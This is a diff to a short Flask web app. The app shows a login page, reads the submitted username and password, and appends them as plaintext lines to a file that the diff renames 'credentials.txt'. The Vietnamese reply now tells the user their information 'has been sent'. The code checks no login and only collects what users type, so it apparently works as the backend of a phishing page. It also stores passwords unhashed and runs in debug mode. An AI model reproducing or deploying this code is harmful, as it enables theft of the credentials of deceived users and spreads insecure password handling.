@@ -1,18 +1,18 @@
-from flask import Flask, render_template, request
+from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
 @app.route('/')
-def login():
+def homepage():
     return render_template('login.html')
 
 @app.route('/submit', methods=['POST'])
-def handle_submission():
+def submit():
     username = request.form['username']
     password = request.form['password']
-    with open('data.txt', 'a') as file:
+    with open('credentials.txt', 'a') as file:
         file.write(f'{username}:{password}\n')
-    return "Cảm ơn bạn đã đăng nhập!"
+    return "Thông tin đã được gửi!"
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     app.run(debug=True)
